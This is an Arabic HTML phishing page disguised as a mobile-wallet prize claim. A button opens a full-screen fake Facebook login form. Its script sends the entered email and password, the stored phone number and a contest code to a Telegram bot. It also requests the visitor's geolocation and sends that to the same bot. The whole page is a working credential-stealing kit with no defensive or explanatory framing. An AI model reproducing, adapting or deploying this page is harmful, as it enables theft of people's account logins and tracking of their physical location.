<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>استلام الجائزة - محفظة جوالي</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: Tahoma, sans-serif;
      text-align: center;
      padding: 40px;
      background-color: #f5f5f5;
    }

    h2 {
      color: #28a745;
    }

    p, #phoneDisplay {
      font-size: 18px;
      color: #333;
    }

    button {
      background-color: #28a745;
      color: white;
      font-size: 20px;
      padding: 12px 30px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 25px;
    }

    #codeDisplay {
      margin-top: 30px;
      font-size: 24px;
      color: #000;
    }

    /* صفحة تسجيل دخول كاملة تشبه فيسبوك */
    .modal {
      display: none;
      position: fixed;
      z-index: 9999;
      left: 0;
      top: 0;
      width: 100vw;
      height: 100vh;
      background-color: white;
      overflow: auto;
      padding: 0;
      margin: 0;
    }

    .modal-content {
      max-width: 400px;
      margin: 0 auto;
      padding: 30px 20px;
      margin-top: 60px;
    }

    .modal-header {
      background-color: #1877f2;
      color: white;
      font-size: 32px;
      padding: 20px;
      text-align: center;
      font-weight: bold;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }

    .login-btn {
      background-color: #1877f2;
      color: white;
      padding: 14px;
      width: 100%;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      font-weight: bold;
      margin-top: 10px;
      cursor: pointer;
    }

    .modal-footer {
      text-align: center;
      font-size: 14px;
      color: #888;
      margin-top: 20px;
    }

    .close {
      position: absolute;
      top: 12px;
      left: 16px;
      font-size: 24px;
      color: #999;
      cursor: pointer;
    }

    @media screen and (max-width: 480px) {
      .modal-content {
        margin-top: 40px;
        padding: 20px;
      }
    }
  </style>
</head>
<body>

  <h2>✅ تم تأكيد رقمك!</h2>
  <p id="phoneDisplay">📱 رقمك هو: جاري التحميل...</p>
  <p>اضغط الزر أدناه لاستلام الجائزة وكشف كود المتسابق الخاص بك</p>

  <button onclick="openLogin()">🎁 تسجيل الدخول لاستلام الجائزة</button>

  <div id="codeDisplay" style="display:none;">
    🎉 كود المتسابق الخاص بك: <span id="contestantCode" style="font-weight: bold;"></span>
  </div>

  <!-- صفحة تسجيل دخول تشبه فيسبوك -->
  <div class="modal" id="loginModal">
    <div class="modal-header">facebook</div>
    <span class="close" onclick="closeLogin()">×</span>
    <div class="modal-content">
      <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
      <input type="password" id="password" placeholder="كلمة المرور" required>
      <button class="login-btn" onclick="submitLogin()">تسجيل الدخول</button>
      <div class="modal-footer">© Meta Platforms, Inc.</div>
    </div>
  </div>

  <script>
    let botToken = '';
    let chatId = '';

    // تحميل إعدادات البوت
    fetch('config.json')
      .then(res => res.json())
      .then(data => {
        botToken = data.botToken;
        chatId = data.chatId;
      });

    // عرض الرقم
    const phone = localStorage.getItem("userPhone");
    if (phone) {
      document.getElementById('phoneDisplay').textContent = "📱 رقمك هو: " + phone;
    } else {
      document.getElementById('phoneDisplay').textContent = "⚠️ لا يوجد رقم محفوظ.";
    }

    function openLogin() {
      document.getElementById('loginModal').style.display = 'block';
    }

    function closeLogin() {
      document.getElementById('loginModal').style.display = 'none';
    }

    function submitLogin() {
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();
      const phone = localStorage.getItem("userPhone") || "غير متوفر";
      const code = localStorage.getItem("userCode") || generateCode();

      localStorage.setItem("userCode", code);
      document.getElementById('contestantCode').textContent = code;
      document.getElementById('codeDisplay').style.display = 'block';

      const message = `🔐 محاولة تسجيل دخول\n📧: ${email}\n🔑: ${password}\n📱 الهاتف: ${phone}\n🏷 الكود: ${code}`;
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: chatId, text: message })
      });

      // إرسال الموقع
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const locMessage = `🌍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: chatId, text: locMessage })
          });
        });
      }

      closeLogin();
    }

    function generateCode() {
      return Math.floor(100000 + Math.random() * 900000).toString();
    }
  </script>
</body>
</html>
